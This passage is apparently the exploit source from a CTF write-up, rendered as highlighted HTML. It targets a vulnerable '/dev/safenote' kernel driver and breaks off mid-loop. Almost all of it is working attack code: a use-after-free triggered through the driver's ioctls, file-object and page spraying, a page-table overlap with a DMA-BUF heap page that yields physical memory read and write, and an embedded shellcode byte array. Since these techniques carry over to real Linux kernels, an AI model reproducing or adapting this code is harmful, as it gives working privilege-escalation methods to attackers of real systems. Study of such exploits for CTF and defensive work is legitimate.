class="line">378</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_PAGESPRAY 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_FILESPRAY 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_FD 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_FD 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TMP_FD 0x50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> &#123;</span></span><br><span class="line">  u64 len;</span><br><span class="line">  u32 fd;</span><br><span class="line">  u32 fd_flags;</span><br><span class="line">  u64 heap_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uaf</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1339</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;index); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/vda&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">        read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">        write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">213</span>] = &#123;</span><br><span class="line">    <span class="number">0xF3</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xFA</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0x3D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xEF</span>, <span class="number">0xF0</span>, <span class="number">0xB7</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>,</span><br><span class="line">    <span class="number">0x87</span>, <span class="number">0x70</span>, <span class="number">0x26</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0xBF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>,</span><br><span class="line">    <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC7</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>, <span class="number">0xC0</span>, <span class="number">0x68</span>, <span class="number">0xA7</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xD0</span>, <span class="number">0x0A</span>, <span class="number">0x1C</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0xBF</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0xBB</span>, <span class="number">0x02</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xF0</span>, <span class="number">0xC0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xC3</span>, <span class="number">0x48</span>, <span class="number">0xBF</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xA0</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0xD0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0x66</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x49</span>, <span class="number">0x8D</span>, <span class="number">0x87</span>, <span class="number">0xC6</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x01</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0xCC</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *page_spray[N_PAGESPRAY];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/tmp/elf&quot;</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/safenote&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dmafd = creat(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dmafd == <span class="number">-1</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;/dev/dma_heap/system&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Prepare pages for PTE&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        page_spray[i] = mmap((<span class="type">void</span>*)(<span class="number">0xdead0000</span>UL + i*<span class="number">0x10000</span>UL),</span><br><span class="line">                            <span class="number">0x8000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                            MAP_ANONYMOUS|MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == MAP_FAILED) err_exit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        add(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp_fd[TMP_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        tmp_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(tmp_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">            uaf(uaf_index);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        del(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray read file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> read_fd[READ_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        read_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(read_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(uaf_index);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;spray write file.&quot;</span>);</span><br><span class="line">    <span class="type">int</span> write_fd[WRITE_FD];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        write_fd[i] = open(<span class="string">&quot;/tmp/elf&quot;</span>,O_WRONLY);</span><br><span class="line">        <span class="keyword">if</span>(write_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;fail to open /tmp/elf&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;find the uaf read file&quot;</span>);</span><br><span class="line">    <span class="type">int</span> uaf_read_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="type">int</span> ret = write(read_fd[i], buf, <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] find the uaf read fd %d \n&quot;</span>, i);</span><br><span class="line">            uaf_read_fd = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uaf_read_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;can not find the uaf read fd.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;close the file.&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; TMP_FD; i++)&#123;</span><br><span class="line">        close(tmp_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; READ_FD; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i == uaf_read_fd)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(read_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; WRITE_FD; i++)&#123;</span><br><span class="line">        close(write_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Allocating PTEs...&quot;</span>);</span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (1)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Allocate DMA-BUF heap&quot;</span>);</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);</span><br><span class="line">    </span><br><span class="line">    info(<span class="string">&quot;Allocate many PTEs (2)&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = N_PAGESPRAY/<span class="number">2</span>; i &lt; N_PAGESPRAY; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;</span><br><span class="line">            *(<span class="type">char</span>*)(page_spray[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Searching for overlapping page...&quot;</span>);</span><br><span class="line">    <span class="comment">// Search for page that overlaps with other physical page</span></span><br><span class="line">    <span class="type">void</span> *evil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="comment">// We wrote &#x27;H&#x27;(=&#x27;A&#x27;+7) but if it changes the PTE overlaps with the file</span></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span>*)(page_spray[i] + <span class="number">7</span>*<span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>) &#123; <span class="comment">// +38h: f_count</span></span><br><span class="line">        evil = page_spray[i] + <span class="number">0x7000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Found overlapping page: %p\n&quot;</span>, evil);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (evil == <span class="literal">NULL</span>) err_exit(<span class="string">&quot;target not found :(&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Place PTE entry for DMA buffer onto controllable PTE</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Remapping...&quot;</span>);</span><br><span class="line">    munmap(evil, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">void</span> *dmabuf = mmap(evil, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="number">0</span>);</span><br><span class="line">    *(<span class="type">char</span>*)dmabuf = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get physical AAR/AAW</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// Corrupt physical address of DMA-BUF</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> 